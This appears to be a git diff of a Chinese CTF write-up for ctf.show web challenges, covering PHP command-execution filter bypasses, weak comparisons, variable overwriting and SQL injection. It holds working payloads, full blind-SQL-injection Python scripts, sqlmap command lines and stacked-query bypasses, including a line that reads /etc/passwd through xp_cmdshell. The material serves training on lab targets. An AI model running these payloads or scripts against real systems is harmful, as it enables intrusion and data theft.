@@ -13,46 +13,13 @@ categories:
 >- `array|object` --> 意思是参数既可以是 array 也可以是 object
 >- `void` --> 作为返回类型意味着函数的返回值是无用的。void 作为参数列表意味着函数不接受任何参数。从 PHP 7.1 开始 void 接受一个函数为返回类型
 >- `...` --> 在函数原型中，`$...` 表示等等的意思。当一个函数可以接受任意个参数时使用此变量名
-
-<!-- TOC -->
-
-- [信息搜集](#信息搜集)
-    - [web5](#web5)
-    - [web6](#web6)
-    - [web14](#web14)
-    - [web16](#web16)
-    - [web19](#web19)
-    - [web20](#web20)
-- [爆破](#爆破)
-    - [web21](#web21)
-- [命令执行（RCE）](#命令执行rce)
-    - [web31](#web31)
-    - [web32-36](#web32-36)
-- [!/bin/sh](#binsh)
-- [encoding: utf-8](#encoding-utf-8)
-- [encoding: utf-8](#encoding-utf-8-1)
-- [encoding: utf-8](#encoding-utf-8-2)
-- [py2](#py2)
-- [encoding: utf-8](#encoding-utf-8-3)
-- [@Author:  yq1ng](#author--yq1ng)
-- [@Date:    2020-11-09 18:30](#date----2020-11-09-1830)
-- [-*- coding: utf-8 -*-](#---coding-utf-8---)
-- [@Author: h1xa](#author-h1xa)
-- [@Date:   2020-11-07 05:00:51](#date---2020-11-07-050051)
-- [@Last Modified by:   h1xa](#last-modified-by---h1xa)
-- [@Last Modified time: 2020-11-07 16:28:53](#last-modified-time-2020-11-07-162853)
-- [@email: h1xa@ctfer.com](#email-h1xactfercom)
-- [@link: https://ctfer.com](#link-httpsctfercom)
-
-<!-- /TOC -->
-
 <!--more-->
 # 信息搜集
 ## web5
 php文件泄露，访问`index.phps`
 ## web6
 常见文件备份参见[此博客](https://www.cnblogs.com/Lmg66/p/13598803.html)
-## web14
+##  web14
 泄露重要(editor)的信息 直接在url后面添加/editor
 ## web16
 payload:`/tz.php` --> 雅黑PHP探针\
@@ -88,18 +55,18 @@ c=?><?=`$_GET[1]`;&1=cat flag.php//查看源代码
 c=?><?=passthru($_GET[1]);&1=cat flag.php//查看源代码
 ```
 ## web32-36
-```if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c))```\
+``if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c))``\
 payload:
 `?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php`
 ## web37/39
 ```php
-if(!preg_match("/flag/i", $c)){ 
-    include($c); 
-    echo $flag; 
+if(!preg_match("/flag/i", $c)){
+    include($c);
+    echo $flag;
 }
-if(!preg_match("/flag/i", $c)){ 
-    include($c.".php"); 
-} 
+if(!preg_match("/flag/i", $c)){
+    include($c.".php");
+}
 //?c=data://text/plain,<?php system('cat f*');?>
 //39 output：$flag="flag{8262a004-69e7-460b-b412-05d4178c08f8}";.php
 //39 data://text/plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用
@@ -169,12 +136,14 @@ if(isset($_GET['c'])){
     highlight_file(__FILE__);
 }
 ```
-Lazzaro师傅真狠啊，字母全凉了，不过羽师傅提供了一个[骚思路](https://blog.csdn.net/qq_46091464/article/details/108555433)，真是活久见。。\
+Lazzaro师傅真狠啊，字母全凉了，不过羽师傅提供了一个[骚思路](https://blog.csdn.net/qq_46091464/article/details/108555433)，真是活久见。。
+
 1. payload：`?c=/???/????64 ????.???` -->  `/bin/base64 flag.php`
 2. 通过该命令压缩flag.php 然后进行下载\
     payload：`?c=/???/???/????2 ????.???`
     也就是`/usr/bin/bzip2 flag.php`
     然后访问`/flag.php.bz2`进行下载获得`flag.php`
+
 ## web56
 ```php
 if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c))
@@ -470,10 +439,151 @@ $c=bin2hex($b);      //这里直接用去掉=的base64
 ```
 payload：(v2前面随便加两个数字，绕substr的)\
 `GET: v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php` `POST: v1=hex2bin`
+## web104 | 106
+```php
+<?php
+highlight_file(__FILE__);
+include("flag.php");
+if(isset($_POST['v1']) && isset($_GET['v2']){
+    $v1 = $_POST['v1'];
+    $v2 = $_GET['v2'];
+    if(sha1($v1)==sha1($v2)){
+        //106：if(sha1($v1)==sha1($v2) && $v1!=$v2)   --> v1[]=1 v2[]=2
+        echo $flag;
+    }
+}
+?>
+```
+弱比较，和ma5一样，数组绕过，也可以用这个
+```
+aaK1STfY
+0e76658526655756207688271159624026011393
+aaO8zKZF
+0e89257456677279068558073954252716165668
+```
+## web105
+```php
+<?php
+highlight_file(__FILE__);
+include('flag.php');
+error_reporting(0);
+$error='你还想要flag嘛？';
+$suces='既然你想要那给你吧！';
+foreach($_GET as $key => $value){
+    if($key==='error'){//GET不能覆盖error
+        die("what are you doing?!");
+    }
+    $$key=$$value;
+}foreach($_POST as $key => $value){
+    if($value==='flag'){//POST值不能为flag
+        die("what are you doing?!");
+    }
+    $$key=$$value;
+}
+if(!($_POST['flag']==$flag)){//不能直接赋值flag=flag
+    die($error);
+}
+echo "your are good".$flag."\n";
+die($suces);//通过覆盖suces为flag的值得到flag
+?>
+```
+看到`foreach`就想起来变量覆盖
+>`foreach (array_expression as $key => $value)`键名=>键值
+## web107
+可以说是变量覆盖的一种?
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+include("flag.php");
+if(isset($_POST['v1'])){
+    $v1 = $_POST['v1'];
+    $v3 = $_GET['v3'];
+       parse_str($v1,$v2);
+       if($v2['flag']==md5($v3)){
+           echo $flag;
+       }
+}
+?>
+```
+>`parse_str()` --> 将字符串解析成多个变量\
+`parse_str ( string $encoded_string [, array &$result ] ) : void`\
+如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代。\
+如果未设置 array 参数，则由该函数设置的变量将覆盖已存在的同名变量。\
+PHP 的变量名不能带「点」和「空格」，所以它们会被转化成下划线。 用本函数带 result 参数，也会应用同样规则到数组的键名。\
+php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。
 
+payload:`GET:?v3=yq1ng` `POST: v1=flag=9618785fbf6d1b09b13d336d040f1880`(flag值为yq1ng加密md5)
+## web108
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+include("flag.php");
+if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE{//类似 preg_match() ，但 preg_match() 比其更快
+    die('error');
+}
+//只有36d的人才能看到flag
+if(intval(strrev($_GET['c']))==0x36d){//对c逆序，取整数,0x36d==877
+    echo $flag;
+}
+?>
+```
+ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配\
+payload：`?c=a%00778`
+## web109
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+if(isset($_GET['v1']) && isset($_GET['v2'])){
+    $v1 = $_GET['v1'];
+    $v2 = $_GET['v2'];
+
+    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
+            eval("echo new $v1($v2());");//找到一个内置类，使其不报错且能echo，Exception，ReflectionClass
+    }
+?>
+```
+payload:\
+` ?v1=Exception&v2=system('cat *')`\
+`?v1=Reflectionclass&v2=system('cat *')`
+## web110
+```php
+<?php
+highlight_file(__FILE__);
+error_reporting(0);
+if(isset($_GET['v1']) && isset($_GET['v2'])){
+    $v1 = $_GET['v1'];
+    $v2 = $_GET['v2'];
+
+    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
+            die("error v1");
+    }
+    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
+            die("error v2");
+    }
+
+    eval("echo new $v1($v2());");
+}
+?>
+```
+[filesystemiterator手册](https://www.php.net/manual/zh/class.filesystemiterator.php)
+- [php 快速获取文件夹中文件数量](http://phpff.com/filesystemiterator)
+    ```php
+    <?php
+    $iterator = new FilesystemIterator(__DIR__, FilesystemIterator::SKIP_DOTS);
+    //计算迭代器中元素的个数
+    printf("There were %d Files", iterator_count($iterator));
+    ?>
+    ```
+
+`getcwd()` --> 获取当前工作目录 返回当前工作目录\
+payload: `?v1=FilesystemIterator&v2=getcwd`
 
 # sql
 ## web174
+补：我回来了，不用脚本，结果没flag关键字就行，right、hex等等直接淦\
 `$sql = "select username,password from ctfshow_user4 where username !='flag' and id = '".$_GET['id']."' limit 1;";`\
 ~~妈的(无能狂怒)，~~ 是盲注，道行太浅一直没想到，脚本：
 ```python
@@ -493,7 +603,9 @@ for i in range(1, 45):
             break
 ```
 ## web175
-` if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){`过滤了所有字符，时间盲注
+` if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){`过滤了所有字符，时间盲注\
+11.18补：群主思路：将查询结果输出到文件，在访问。。。骚\
+payload: `1' union select 1,password from ctfshow_user5 where username 'flag' into outfile '/var/wa/html/ctf.txt'-- A`
 ```py
 # encoding: utf-8
 import requests
@@ -670,7 +782,7 @@ def getFlag():
 print(getFlag())
 ```
 ## web187
-sql: `$sql = "select count(*) from ctfshow_user where username = '$username' and password= '$password'";`\
+sql: `$sql = "select count(*) from ctfshow_user where username = '$username' and password= '$password'";`
 ```php
 //waf:
     $username = $_POST['username'];
@@ -705,3 +817,412 @@ sql：`$sql = "select pass from ctfshow_user where username = {$username}";`
       array_push($ret['data'], array('flag'=>$flag));
     }
 ```
+先上payload：`username=1<1&password=0`阿狸师傅tql，逻辑运算符从左到右，所以username只有0|1，也就是相当于`where username!=1`，pass为0是因为密码比较为弱类型，字符串被转为0\
+群主思路：into file写马，但是需要知道绝对路径，(⊙﹏⊙)等我会了来填坑\
+给大佬递茶：username=\`username\`/\`pass\`&pass=0即可登陆
+## web189
+
+## web190 - 194
+sql: `$sql = "select pass from ctfshow_user where username = '{$username}'";`
+```php
+//waf
+//密码检测
+if(!is_numeric($password)){
+$ret['msg']='密码只能为数字';
+die(json_encode($ret));
+}
+
+//密码判断
+if($row['pass']==$password){
+    $ret['msg']='登陆成功';
+}
+
+//TODO:感觉少了个啥，奇怪
+if(preg_match('/file|into|ascii|ord|hex|substr|char|left|right|substring/i', $username)){
+    $ret['msg']='用户名非法';
+    die(json_encode($ret));
+}
+```
+垃圾脚本，table_name用的以前写的脚本，非常慢，可以用column_name的方法，直接猜全部的，先判断数量再逐个判断name只是为了好看。。。大佬笑笑就好，自行发挥，payload不限，我懒得改了。。。优化了，在下面
+```python
+# encoding: utf-8
+# @Author:  yq1ng
+# @Date:    2020-11-17 17:30
+
+import requests
+
+url = 'http://af606d85-dee0-462e-8ef0-6718c277c25d.chall.ctf.show/api/'
+data = {"username":"","password":"1"}
+tb_num = 0
+tb_length = 0
+tb_name = ''
+tb_list = []
+all_column_len=0
+column_name = ''
+flag = ''
+
+#table_num
+print("\nJudging the number of tables in the database...")
+for x in range(1,100):
+    payload = "'or (select count(*) from information_schema.tables where table_schema=database())=%d#"% x
+    data["username"] = payload
+    #print(data)
+    r = requests.post(url,data = data)
+    print("\r[+]There are %d tables in this database"% x,end = '')
+    if r"\u5bc6\u7801\u9519\u8bef" in r.text:
+        tb_num = x
+        break
+#table_name
+print("\nGetting the table name...")
+for x in range(0,tb_num):
+    tb_name = ''
+    #table_length
+    for y in range(1,21):
+        payload = "'or (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d#"% (x,y)
+        data["username"] = payload
+        r = requests.post(url,data = data)
+        #print(url + payload)
+        if r"\u5bc6\u7801\u9519\u8bef" in r.text:
+            tb_length = y
+            #print(tb_length)
+            #table_name
+            for z in range(1,tb_length+1):
+                for i in r'0123456789abcdefghijklmnopqrstuvwxyz-_':
+                    payload = "'or (select mid(table_name,%d,1) from information_schema.tables where table_schema=database() limit %d,1)='%c'#"% (z,x,i)
+                    data["username"] = payload
+                    r = requests.post(url,data = data)
+                    #print(data)
+                    if r"\u5bc6\u7801\u9519\u8bef" in r.text:
+                        tb_name += i
+                        break
+            print("[+]" + tb_name)
+            tb_list.append(tb_name)
+            break
+print("The table names in this database are：",tb_list)
+
+#column_name
+print("\nGuess the column names in the %s table......"% tb_list[0])
+for x in range(1,100):
+    payload = "' or (select length(group_concat(column_name)) from information_schema.columns where table_name='%s')=%d#"%(tb_list[0],x)
+    data["username"] = payload
+    #print(data)
+    r = requests.post(url,data = data)
+    if r"\u5bc6\u7801\u9519\u8bef" in r.text:
+        all_column_len = x
+        print("[+]All listed lengths are : %d"%(all_column_len-1))
+        break
+for x in range(1,all_column_len+1):
+    for y in r'1234567890abcdefghijklmnopqrstuvwxyz-_,':
+        payload = "'or (select mid(group_concat(column_name),%d,1) from information_schema.columns where table_name='%s')='%c'#"%(x,tb_list[0],y)
+        data["username"] = payload
+        r = requests.post(url,data = data)
+        if r"\u5bc6\u7801\u9519\u8bef" in r.text:
+            column_name += y
+            break
+print("[+]The column name in the %s table is %s"%(tb_list[0],column_name))
+
+#flag
+print("\nGetting the flag......")
+for x in range(1,100):
+    for y in r'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}':
+        payload = "'or (select mid(group_concat(f1ag),%d,1) from %s)='%c'#"%(x,tb_list[0],y)
+        data["username"] = payload
+        #print(data)
+        r = requests.post(url,data = data)
+        if r"\u5bc6\u7801\u9519\u8bef" in r.text:
+            flag += y
+            print("\r[+]The flag is %s"% flag,end = '')
+            break
+    if '}' in flag:
+        break
+```
+大佬笑笑就好，嘿嘿
+```python
+# encoding: utf-8
+# @Author:  yq1ng
+# @Date:    2020-11-17 17:30
+
+import requests
+
+url = 'http://c7a0f777-8dd9-4fa8-a5fd-8f704d8078dc.chall.ctf.show/api/'
+data = {"username":"","password":"1"}
+
+tb_name = ''
+all_column_len=0
+column_name = ''
+flag = ''
+
+#table_name
+print("\nGetting the table name...")
+for x in range(1,100):# 不晓得有多少，尽量大喽，当然，while true也行
+    for y in r'ctfshow_abdegijklmnopqruvxyz-,0123456789!':# 根据命名规则，表名是不会有！的，所以嘿嘿
+        payload = "'or (select mid(group_concat(table_name),%d,1) from information_schema.tables where table_schema=database())='%c'#"% (x,y)
+        data["username"] = payload
+        #print(data)
+        r = requests.post(url,data = data)
+        if r"\u5bc6\u7801\u9519\u8bef" in r.text:
+            tb_name += y
+            break
+    print("\r[+]table name is %s"% tb_name, end = '')
+    if y=="!":
+        break
+print("\n\nDone!The table names in this database are：",tb_name)
+
+guess_tbName = input("\nPlease enter the name of the table you want to guess: ")
+#column_name
+print("\nGuess the column names in the %s table......"% guess_tbName)
+for x in range(1,100):
+    payload = "' or (select length(group_concat(column_name)) from information_schema.columns where table_name='%s')=%d#"%(guess_tbName,x)
+    data["username"] = payload
+    #print(data)
+    r = requests.post(url,data = data)
+    if r"\u5bc6\u7801\u9519\u8bef" in r.text:
+        all_column_len = x
+        print("[+]All listed lengths are : %d"%(all_column_len-1))
+        break
+for x in range(1,all_column_len+1):
+    for y in r'1234567890abcdefghijklmnopqrstuvwxyz-_,':
+        payload = "'or (select mid(group_concat(column_name),%d,1) from information_schema.columns where table_name='%s')='%c'#"%(x,guess_tbName,y)
+        data["username"] = payload
+        r = requests.post(url,data = data)
+        if r"\u5bc6\u7801\u9519\u8bef" in r.text:
+            column_name += y
+            break
+    print("\r[+]The column name in the %s table is %s"%(guess_tbName,column_name), end = '')
+
+guess_flag = input("\n\nOkay, we're getting a flag. Tell me the list:")
+#flag
+print("\nGetting the flag......")
+for x in range(1,100):
+    for y in r'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}':
+        payload = "'or (select mid(group_concat(%s),%d,1) from %s)='%c'#"%(guess_flag,x,guess_tbName,y)
+        data["username"] = payload
+        #print(data)
+        r = requests.post(url,data = data)
+        if r"\u5bc6\u7801\u9519\u8bef" in r.text:
+            flag += y
+            print("\r[+]The flag is %s"% flag,end = '')
+            break
+    if '}' in flag:
+        break
+```
+
+## web195
+sql:`$sql = "select pass from ctfshow_user where username = {$username};";`
+```php
+//waf
+//密码检测
+if(!is_numeric($password)){
+$ret['msg']='密码只能为数字';
+die(json_encode($ret));
+}
+
+//密码判断
+if($row['pass']==$password){
+    $ret['msg']='登陆成功';
+}
+
+//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
+if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username)){
+$ret['msg']='用户名非法';
+die(json_encode($ret));
+}
+
+if($row[0]==$password){
+    $ret['msg']="登陆成功 flag is $flag";
+}
+```
+开始用的``admin;update`ctfshow_user`set`pass`=1;``，一直不对，想了想，字符串需要引号啊，引号又被ban了，所以改用户名为数字就好\
+payload:``1;update`ctfshow_user`set`username`=1;`` `password=1`，不能登录的话就把pass也更新为1``1;update`ctfshow_user`set`pass`=1;``
+
+## web196
+sql: `  $sql = "select pass from ctfshow_user where username = {$username};";`
+```php
+waf:
+  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
+  if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username)){
+    $ret['msg']='用户名非法';
+    die(json_encode($ret));
+  }
+
+  if(strlen($username)>16){
+    $ret['msg']='用户名不能超过16个字符';
+    die(json_encode($ret));
+  }
+
+  if($row[0]==$password){
+      $ret['msg']="登陆成功 flag is $flag";
+  }
+```
+这题略坑，说是过滤`select`但是没过滤，直接`1;select(1)` pass: `1`过了\
+用户名没有为1的，所以返回的结果集是后面的，不用纠结`$row[0]==$password`
+
+## web201
+~~玩会sqlmap，189往后先搁置了哈哈哈哈，系列题目，直接dump了~~\
+`py2 .\sqlmap.py -u http://3b960f3f-27df-4014-a22f-e075453fe298.chall.ctf.show/api/index.php?id=1 --referer=ctf.show  --dbms=mysql -D ctfshow_web -T ctfshow_user -C pass --dump --headers="Content-Type: text/plain"`
+
+## web203
+>--method=* 调整请求方式
+
+` py2 .\sqlmap.py -u "http://695acb0a-fd61-42e7-866b-1ffa3b15f5e0.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --dbms=mysql -D ctfshow_web -T ctfshow_user -C pass --dump`
+
+## web204
+hint：cookie\
+`py2 .\sqlmap.py -u "http://d992d54c-ff57-4d7f-9667-b6f96906eadc.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --cookie="*your cookie*" --dbms=mysql -D ctfshow_web -T ctfshow_user -C pass --dump`
+## web205
+>api调用需要鉴权
+
+在`URL/js/select.js`发现`api/getToken.php`，sqlmap在此鉴权，本次库、表、字都有所改变\
+>`--batch` --> 静默选项，sqlmap自动确认\
+`--safe-url=SAFEURL` --> 设置在测试目标地址前访问的安全链接\
+`--safe-freq=SAFE..` --> 设置两次注入测试前访问安全链接的次数
+
+爆库：`py2 .\sqlmap.py -u "http://5d767ccc-4f5b-4671-906a-ae6e7e2e483b.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url="http://5d767ccc-4f5b-4671-906a-ae6e7e2e483b.chall.ctf.show/api/getToken.php" --safe-freq=1 --dbms=mysql --dbs --batch`\
+爆表：`前面相同  --dbms=mysql -D ctfshow_web --tables --batch`\
+爆字段：`--dbms=mysql -D ctfshow_web -T ctfshow_flax --dump --batch`
+## web206
+>sql需要闭合\
+`--prefix=PREFIX` --> 攻击载荷的前缀\
+`--suffix=SUFFIX` --> 攻击载荷的后缀
+
+database:`py2 .\sqlmap.py -u "http://979152ce-ff3e-452d-80f1-e4723f247b66.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url="http://979152ce-ff3e-452d-80f1-e4723f247b66.chall.ctf.show/api/getToken.php" --safe-freq=1 --dbms=mysql --dbs --batch --prefix="')" --suffix="and ('y')=('y"`\
+tables: `ctfshow_flaxc` and `ctfshow_user`\
+`--dbms=mysql -D ctfshow_web --tables --batch --prefix="')" --suffix="and ('y')=('y"`\
+column: `--dbms=mysql -D ctfshow_web -T ctfshow_flaxc --dump --batch --prefix="')" --suffix="and ('y')=('y"`
+一开始没爆出来，出了这个
+```
++---------+---------+---------+
+| id      | tes     | flagv   |
++---------+---------+---------+
+| <blank> | <blank> | <blank> |
++---------+---------+---------+
+```
+就加了`-C flagv`参数，got it\
+突然想知道sqlmap怎么爆破的，加上`--proxy=http://127.0.0.1:8080`，bp抓包看看
+
+1. 先请求了鉴权页面`GET /api/getToken.php`,然后`PUT /api/index.php` `id=1` 
+2. 循环第一步，每次先鉴权再上payload
+3. 先用bool盲注试了一下，再用报错，最后时间盲注
+
+前面一堆看不懂的操作，从我看懂的开始（不懂的也谷歌不到）\
+- 进行xss？还用了目录穿越读文件。。不懂\
+    `7178 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#`
+- 报错\
+  `1') AND (SELECT 5989 FROM(SELECT COUNT(*),CONCAT(0x716b626271,(SELECT (ELT(5989=5989,1))),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)and ('y')=('y`
+- 时间盲注\
+  `1') AND SLEEP(5)and ('y')=('y`
+- 依次增加字段数\
+  `1') UNION ALL SELECT NULL,NULL,NULLand ('y')=('y`
+- 再次验证sleep\
+  `id=1') AND 8923=IF((49=49),SLEEP(5),8923)and ('y')=('y`
+- 判断表中记录\
+  `id=1') AND 4849=IF((ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM ctfshow_web.ctfshow_flaxc),1,1))>49),SLEEP(5),4849)and ('y')=('y`
+  再判断是否等于49：`!=49`
+- 开始判断内容了，似乎是二分法\
+  `id=1') AND 2696=IF((ORD(MID((SELECT IFNULL(CAST(flagv AS CHAR),0x20) FROM ctfshow_web.ctfshow_flaxc ORDER BY flagv LIMIT 0,1),1,1))>151259),SLEEP(5),2696)and ('y')=('y`\
+我能看懂的流程也就这么多，应该会有借鉴payload的时候，前面七七八八的pl真是不懂，response也没东西，不晓得sqlmap是在干嘛，但应该是有用的，有兴趣可以抓包搜一下pl
+## web207
+>`--tamper` 的初体验\
+waf：`preg_match('/ /', $str)`\
+`--current-db` 检索当前使用的数据库名称\
+`--threads=num` 线程
+
+要上攻击载荷了，就是编码一些字符，查看js还是有鉴权，waf过滤了空格，攻击载荷可以在`sqlmap\tamper`目录里面看到\
+时间盲注，直接爆当前数据库就好，不然等的心累\
+database: `py2 .\sqlmap.py -u "http://050a59e1-204c-45f2-9d4c-1856ee80a196.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url="http://050a59e1-204c-45f2-9d4c-1856ee80a196.chall.ctf.show/api/getToken.php" --safe-freq=1 --dbms=mysql --current-db --dump --batch --prefix="')" --suffix="and ('y')=('y" --tamper=space2comment`\
+额，上面的直接给我把库和表都跑出来了，它还不尽兴，想一下把数据都跑出来，但是时间盲注太慢了，我只要flag就行
+
+flag: `  -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump`最后加了个`--threads=3`时间盲注太慢了，加了个线程
+## web208
+>`$id = str_replace('select', '', $id);`\
+`preg_match('/ /', $str)`
+
+继续加载荷，过滤了`select`和空格
+
+## web224
+>[Y1ng](https://www.gem-love.com/ctf/2283.html#%E4%BD%A0%E6%B2%A1%E8%A7%81%E8%BF%87%E7%9A%84%E6%B3%A8%E5%85%A5)大师傅博客
+
+用的群里师傅的，payload，可以去下载一波~~，不多解释啦
+
+## web226
+>堆叠\
+sql: `$sql = "select id,username,pass from ctfshow_user where username = '{$username}';";`\
+waf: `preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i',$username)`
+
+预编译淦，引用自[简简的我](https://www.jianshu.com/p/36f0772f5ce8)
+>`PREPARE name from '[my sql sequece]';` --> 预定义SQL语句\
+`EXECUTE name;` --> 执行预定义SQL语句\
+`(DEALLOCATE || DROP) PREPARE name;` --> 删除预定义SQL语句
+
+>预编译也能用变量\
+`SET @tn = 'hahaha';`  //存储表名\
+`SET @sql = concat('select * from ', @tn);`  //存储SQL语句\
+`PREPARE name from @sql;`   //预定义SQL语句\
+`EXECUTE name;`  //执行预定义SQL语句\
+`(DEALLOCATE || DROP) PREPARE sqla;`  //删除预定义SQL语句
+
+但是ban了set，变量凉凉\
+先查表：`user1';show tables;#`\
+payload1: ``user1';PREPARE yq1ng from concat(char(115,101,108,101,99,116), ' * from `ctfshow_flagasa` ');EXECUTE yq1ng;#``\
+注：`char(115,101,108,101,99,116)<----->'select'`\
+payload2: ``user1';PREPARE yq1ng from concat('s','elect', ' * from `ctfshow_flagasa` ');EXECUTE yq1ng;#``
+
+## web226
+sql: `$sql = "select id,username,pass from ctfshow_user where username = '{$username}';";`\
+waf: `preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i',$username)`\
+还好，上一条hex编码就好了，记得前面加个0x；\
+查表：`?username=user1';PREPARE yq1ng from 0x73686F77207461626C6573;EXECUTE yq1ng;#` --> `hex("show tables")`\
+flag：`?username=user1';PREPARE yq1ng from 0x73656C656374202A2066726F6D2063746673685F6F775F666C61676173;EXECUTE yq1ng;#`
+
+## web227
+>MySQL的存储过程\
+建议先看两个参考:\
+[MySQL 存储过程介绍](https://www.runoob.com/w3cnote/mysql-stored-procedure.html),
+[MySQL—查看存储过程和函数](https://blog.csdn.net/qq_41573234/article/details/80411079)
+
+照群主的话说就是flag即在表内又不在表内\
+先看表，和上一题一样，接着。。。把表翻了一遍没flag，问了群主是存储过程，Google无果，给了payload：`1';call getFlag();`\
+然后查`call`，找到上述两篇链接，本地也复现了一下，也是类似预编译，用户自定义函数再去调用，直接`SELECT   *   FROM   information_schema.Routines`可以发现所有自定函数及内容，payload：`?username=1';PREPARE yq1ng from 0x53454C4543542020202A20202046524F4D202020696E666F726D6174696F6E5F736368656D612E526F7574696E6573;EXECUTE yq1ng;#`\
+本题也算是初步认识了存储过程，以后再遇见也有点谱，复现记录：
+```mysql
+mysql> delimiter $$ //临时定义结束符为$$
+mysql> create procedure test() //创建函数
+    -> begin //开始
+    ->     select "flag{test}"; //语句
+    -> end$$ //结束+结束符
+Query OK, 0 rows affected (0.36 sec)
+mysql> delimiter ; //将结束符改为;
+mysql> call test(); //调用定义函数
++------------+
+| flag{test} |
++------------+
+| flag{test} |
++------------+
+1 row in set (0.07 sec)
+
+Query OK, 0 rows affected (0.07 sec)
+```
+
+## web228 | 229 |230
+```
+sql
+//分页查询
+$sql = "select id,username,pass from ctfshow_user where username = '{$username}';";
+$bansql = "select char from banlist;";
+```
+
+```
+waf
+//师傅说内容太多，就写入数据库保存
+if(count($banlist)>0){
+foreach ($banlist as $char) {
+    if(preg_match("/".$char."/i", $username)){
+    die(json_encode($ret));
+    }
+}
+}
+```
+
+和226一样的套路。。。主要是sql和waf不太一样，所有没放一起
+
+过滤挺多，懒得解码了：`{"id":"2","username":"user1","pass":"111"},{"id":"1","char":"union"},{"id":"2","char":"file"},{"id":"3","char":"into"},{"id":"4","char":"handler"},{"id":"5","char":"db"},{"id":"6","char":"select"},{"id":"7","char":"update"},{"id":"8","char":"dump"},{"id":"9","char":"delete"},{"id":"10","char":"create"},{"id":"11","char":"drop"},{"id":"12","char":"show"},{"id":"13","char":"describe"},{"id":"14","char":"set"},{"id":"15","char":"alter"}`
